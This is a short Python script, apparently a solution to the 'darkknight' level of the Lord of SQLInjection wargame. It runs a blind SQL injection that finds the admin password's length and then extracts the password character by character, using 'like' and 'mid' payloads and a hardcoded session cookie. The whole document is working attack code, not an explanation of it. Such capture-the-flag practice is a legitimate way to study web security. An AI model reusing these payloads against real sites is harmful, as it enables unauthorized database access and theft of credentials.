import requests
length=0
session_id={'PHPSESSID':'008vhbf6qj4hagqki9dr9aplh5'}
parameters="01234567890123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"

for i in range(1,10):
    URL = "http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=%20&%20no=1%20or%20length(pw)%20like%20"+str(i)+"%23"
    respone = requests.get(url=URL,cookies=session_id)
    print(respone.url)
    if 'Hello admin' in respone.text:
        print(i)
        length=i
        break
password=''
for i in range(1,length+1):
    for j in parameters:
        URL = "http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
        query = "?no=1 or id like \"admin\" and mid(pw,"+str(i)+",1) like \""+str(j)+"\"%23"
        URL = URL+query
        respone=requests.get(url=URL,cookies=session_id)
        print(respone.url,"password : "+password)
        if 'Hello admin' in respone.text:
            password+=str(j)
            print(j)
            break
print(password)
